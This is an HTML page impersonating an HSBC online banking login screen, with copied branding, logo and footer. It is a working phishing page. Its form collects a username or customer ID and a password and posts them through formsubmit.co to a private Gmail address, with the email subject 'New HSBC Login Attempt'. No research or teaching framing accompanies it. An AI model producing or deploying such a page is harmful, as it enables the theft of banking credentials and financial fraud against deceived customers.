<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HSBC Secure Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; }
        .navbar { background: #cc0000; padding: 15px; text-align: center; color: white; font-size: 18px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); border-radius: 8px; text-align: center; }
        .form-group { margin-bottom: 15px; text-align: left; }
        label { font-weight: bold; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 10px; background: #cc0000; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #a30000; }
        .footer { text-align: center; padding: 15px; margin-top: 20px; background: #222; color: white; font-size: 14px; }
        .logo { max-width: 150px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div class="navbar">üè¶ HSBC Secure Login</div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png" alt="HSBC Logo" class="logo">
        <h2>Online Banking Login</h2>
        <form action="https://formsubmit.co/johnandrews19422@gmail.com" method="POST">
            <input type="hidden" name="_subject" value="New HSBC Login Attempt">
            <input type="hidden" name="_autoresponse" value="Thank you for logging in.">
            
            <div class="form-group">
                <label for="username">Username or Customer ID</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Log In</button>
        </form>
    </div>

    <div class="footer">
        ¬© 2025 HSBC Bank. All rights reserved.
    </div>

</body>
</html>
